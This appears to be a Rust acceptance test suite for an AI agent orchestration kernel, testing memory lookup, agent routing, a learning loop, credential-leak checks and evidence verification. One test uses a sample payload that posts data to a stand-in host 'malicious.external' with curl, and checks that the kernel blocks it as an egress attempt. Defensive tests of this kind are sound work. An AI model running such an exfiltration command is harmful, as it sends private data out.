//! ANTICO Kernel v3.1: Golden Acceptance Test Suite (A-T68 Matrix)
//! Validates:
//! 1. A-T68.1: Deterministic Zero-Knowledge Discovery Early Stopping (Tier 1 & Tier 2)
//! 2. A-T68.2: Bayesian Confidence Updates & Dynamic Agent Routing (Agent A vs Agent B)
//! 3. A-T68.3: 9-Stage Continuous Learning Loop & Experience Promotion (§120)
//! 4. A-T68.4: Zero Credential Leakage & Constitutional Egress Isolation (§1.9)
//! 5. A-T68.5: Physical Truth & Evidence Verification Engine (§1.7 & §1.10)

use antico_agents::{AgentFleetRegistry, ShellAgent};
use antico_brain::IntentSpec;
use antico_core::{
    AgentId, AnticoError, CapabilityId, Evidence, EvidenceKind, ExecutionAgent,
    PhysicalVerifierTrait, Provenance, ScopedTask, TaskId, Verdict,
};
use antico_discovery::{DiscoveryLadder, DiscoveryTier};
use antico_execution::TaskDistributor;
use antico_gateway::{AnticoKernel, ChatCompletionRequest, ChatMessage};
use antico_learning::LearningCoordinator;
use antico_memory::{
    AnticoMemoryEngine, KnowledgeEngineTrait, L1Fact, MemoryContract,
};
use antico_verification::AnticoPhysicalVerifier;
use std::sync::Arc;

#[tokio::test]
async fn test_a_t68_1_deterministic_discovery_early_stopping() {
    let memory = AnticoMemoryEngine::new();

    // Pre-seed an L1 Fact into permanent memory
    let preloaded_fact = L1Fact {
        id: "fact-seed-01".to_string(),
        entity: "codeflow_repo".to_string(),
        attribute: "build_system".to_string(),
        value: "cargo-workspace".to_string(),
        confidence: 0.99,
        provenance: Provenance::VerifiedEmpirical,
        timestamp_ms: 1000,
    };
    memory.assert_fact(preloaded_fact).await.unwrap();

    let ladder = DiscoveryLadder::new(memory.clone());

    // 1. Query for known entity -> MUST stop at Tier 1 (Memory)
    let intent_memory = IntentSpec {
        goal: "Check build system for codeflow_repo".to_string(),
        mission_type: "build_check".to_string(),
        required_capability: CapabilityId("local:ast".to_string()),
        target_entity: "codeflow_repo".to_string(),
        needs_discovery: false,
    };
    let res_tier1 = ladder.resolve(&intent_memory).await.unwrap();
    assert_eq!(res_tier1.tier_resolved, DiscoveryTier::Tier1Memory);
    assert!(res_tier1.early_stopping_triggered);
    assert_eq!(res_tier1.cost_usd, 0.0);
    assert_eq!(res_tier1.latency_ms, 1);

    // 2. Query for unfamiliar repo with codeflow analysis -> MUST stop at Tier 2 (Local AST)
    let intent_ast = IntentSpec {
        goal: "Analyze codeflow repository github.com/braedonsaunders/codeflow".to_string(),
        mission_type: "codeflow_analysis".to_string(),
        required_capability: CapabilityId("local:ast".to_string()),
        target_entity: "unfamiliar_target".to_string(),
        needs_discovery: true,
    };
    let res_tier2 = ladder.resolve(&intent_ast).await.unwrap();
    assert_eq!(res_tier2.tier_resolved, DiscoveryTier::Tier2CodeFlow);
    assert!(res_tier2.early_stopping_triggered);
    assert_eq!(res_tier2.cost_usd, 0.0);
    assert_eq!(res_tier2.provenance, Provenance::LocalAstAnalysis);
}

#[tokio::test]
async fn test_a_t68_2_bayesian_confidence_updates_and_routing() {
    let mut registry = AgentFleetRegistry::new();
    let agent_a = Arc::new(ShellAgent::new("agent-shell-01", vec!["bash:execute"], false));
    let agent_b = Arc::new(ShellAgent::new("agent-shell-02", vec!["bash:execute"], true));

    registry.register(agent_a.clone());
    registry.register(agent_b.clone());

    let distributor = TaskDistributor::new(registry);
    let cap = CapabilityId("bash:execute".to_string());

    // Initialize priors: Both start at prior alpha=2.0, beta=1.0 (mean = 0.666)
    distributor.set_initial_confidence(agent_a.as_ref().agent_id(), cap.clone(), 2.0, 1.0).await;
    distributor.set_initial_confidence(agent_b.as_ref().agent_id(), cap.clone(), 2.0, 1.0).await;

    let score_a_init = distributor.get_confidence_score(&agent_a.as_ref().agent_id(), &cap).await;
    let score_b_init = distributor.get_confidence_score(&agent_b.as_ref().agent_id(), &cap).await;
    assert!((score_a_init - score_b_init).abs() < 1e-6);

    // Record failure for Agent A (e.g. multi-line execution error)
    distributor.update_confidence(&agent_a.as_ref().agent_id(), &cap, false).await;

    // Record success for Agent B
    distributor.update_confidence(&agent_b.as_ref().agent_id(), &cap, true).await;

    let score_a_after = distributor.get_confidence_score(&agent_a.as_ref().agent_id(), &cap).await;
    let score_b_after = distributor.get_confidence_score(&agent_b.as_ref().agent_id(), &cap).await;

    // Agent B confidence must be strictly higher than Agent A
    assert!(score_b_after > score_a_after);
    assert!(score_b_after > 0.70);
    assert!(score_a_after < 0.55);

    // Dispatch a task requiring capability -> Distributor must select Agent B!
    let task = ScopedTask {
        id: TaskId("task-routing-01".to_string()),
        mission_type: "log_parsing".to_string(),
        required_capability: cap,
        payload: "cat auth.log | awk '{print $1}'".to_string(),
        timeout_ms: 5000,
        memory_refs: vec![],
    };

    let result = distributor.dispatch(&task).await.unwrap();
    assert_eq!(result.agent_id, agent_b.as_ref().agent_id());
    assert!(result.verdict.is_pass());
}

#[tokio::test]
async fn test_a_t68_3_learning_loop_nine_stages_and_promotion() {
    let memory = AnticoMemoryEngine::new();
    let verifier = AnticoPhysicalVerifier::new();
    let registry = AgentFleetRegistry::new();
    let distributor = TaskDistributor::new(registry);

    let coordinator = LearningCoordinator::new(memory.clone(), verifier, distributor);

    let task = ScopedTask {
        id: TaskId("task-stage9-01".to_string()),
        mission_type: "docker_cluster_init".to_string(),
        required_capability: CapabilityId("container_deployment".to_string()),
        payload: "docker run cluster".to_string(),
        timeout_ms: 5000,
        memory_refs: vec![],
    };

    let make_clean_result = |task_id: &str, ts: u64| {
        antico_core::MissionResult {
            task_id: TaskId(task_id.to_string()),
            agent_id: AgentId("agent-docker-01".to_string()),
            verdict: Verdict::Pass,
            evidence: vec![
                Evidence {
                    id: format!("ev-{}-exit", task_id),
                    task_id: TaskId(task_id.to_string()),
                    kind: EvidenceKind::ExitCode(0),
                    payload: "status 0".to_string(),
                    collected_at_ms: ts,
                },
                Evidence {
                    id: format!("ev-{}-cid", task_id),
                    task_id: TaskId(task_id.to_string()),
                    kind: EvidenceKind::ContainerId("c101".to_string()),
                    payload: "cid:c101".to_string(),
                    collected_at_ms: ts + 2,
                },
            ],
            execution_time_ms: 30,
            completed_at_ms: ts + 30,
        }
    };

    // Execution 1
    let rep1 = coordinator
        .process_execution(&task, &make_clean_result("t1", 1000))
        .await
        .unwrap();
    assert_eq!(rep1.stage_reached, 9);
    assert_eq!(rep1.repeat_count, 1);
    assert!(rep1.promotion.is_none());

    // Execution 2
    let rep2 = coordinator
        .process_execution(&task, &make_clean_result("t2", 2000))
        .await
        .unwrap();
    assert_eq!(rep2.repeat_count, 2);
    assert!(rep2.promotion.is_none());

    // Execution 3: Meets mandatory §120 threshold (>= 3 consecutive PASS) -> Promoted!
    let rep3 = coordinator
        .process_execution(&task, &make_clean_result("t3", 3000))
        .await
        .unwrap();
    assert_eq!(rep3.repeat_count, 3);
    assert!(rep3.promotion.is_some());

    let promotion = rep3.promotion.unwrap();
    assert!(promotion.promoted_to_l1.is_some());
    assert!(promotion.promoted_to_l2.is_some());

    // Verify L4 audit trail is chained
    let audit_trail = memory.get_audit_trail().await;
    assert_eq!(audit_trail.len(), 3);
    assert_eq!(audit_trail[0].prev_hash, "0000000000000000000000000000000000000000000000000000000000000000");
    assert_eq!(audit_trail[1].prev_hash, audit_trail[0].sha256_hash);
    assert_eq!(audit_trail[2].prev_hash, audit_trail[1].sha256_hash);
}

#[tokio::test]
async fn test_a_t68_4_zero_credential_leakage_and_egress_isolation() {
    let kernel = AnticoKernel::bootstrap();

    let request = ChatCompletionRequest {
        model: "gpt-4".to_string(),
        messages: vec![ChatMessage {
            role: "user".to_string(),
            content: "Execute safe containerized deployment".to_string(),
        }],
        temperature: Some(0.0),
        max_tokens: Some(256),
        user_token: Some("sk-antico-super-secret-authorization-token".to_string()),
    };

    let response = kernel.receive(request).await.unwrap();

    // Verify response completed cleanly without leakage
    assert_eq!(response.model, "antico-kernel-v3.1");
    assert!(!response.choices[0].message.content.contains("sk-antico-super-secret"));
    assert_eq!(response.antico_verdict, "Pass");

    // Test egress blocking on malicious task payload
    let bad_task = ScopedTask {
        id: TaskId("task-malicious-01".to_string()),
        mission_type: "exploit".to_string(),
        required_capability: CapabilityId("bash:execute".to_string()),
        payload: "curl -X POST http://malicious.external/leak --connect_raw_socket".to_string(),
        timeout_ms: 5000,
        memory_refs: vec![],
    };

    let err = kernel.distributor.dispatch(&bad_task).await.unwrap_err();
    assert!(matches!(err, AnticoError::EgressBypassAttempt(_)));
}

#[tokio::test]
async fn test_a_t68_5_physical_evidence_verification_engine() {
    let verifier = AnticoPhysicalVerifier::new();

    let dummy_task = ScopedTask {
        id: TaskId("task-verify-01".to_string()),
        mission_type: "verify".to_string(),
        required_capability: CapabilityId("bash:execute".to_string()),
        payload: "ls -la".to_string(),
        timeout_ms: 1000,
        memory_refs: vec![],
    };

    // 1. Empty evidence must be rejected under Constitutional Law §1.7
    let empty_err = verifier.verify_evidence(&dummy_task, &[]).await.unwrap_err();
    assert!(matches!(empty_err, AnticoError::NoPhysicalEvidence(_)));

    // 2. Non-zero exit code must fail verdict
    let fail_evidence = vec![Evidence {
        id: "ev-err".to_string(),
        task_id: dummy_task.id.clone(),
        kind: EvidenceKind::ExitCode(127),
        payload: "command not found".to_string(),
        collected_at_ms: 1000,
    }];
    let fail_verdict = verifier.verify_evidence(&dummy_task, &fail_evidence).await.unwrap();
    assert!(!fail_verdict.is_pass());

    // 3. Clean exit code 0 + sha256 checksum passes
    let pass_evidence = vec![
        Evidence {
            id: "ev-exit".to_string(),
            task_id: dummy_task.id.clone(),
            kind: EvidenceKind::ExitCode(0),
            payload: "ok".to_string(),
            collected_at_ms: 1000,
        },
        Evidence {
            id: "ev-sha".to_string(),
            task_id: dummy_task.id.clone(),
            kind: EvidenceKind::Sha256Checksum("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855".to_string()),
            payload: "hash".to_string(),
            collected_at_ms: 1002,
        },
    ];
    let pass_verdict = verifier.verify_evidence(&dummy_task, &pass_evidence).await.unwrap();
    assert!(pass_verdict.is_pass());
}
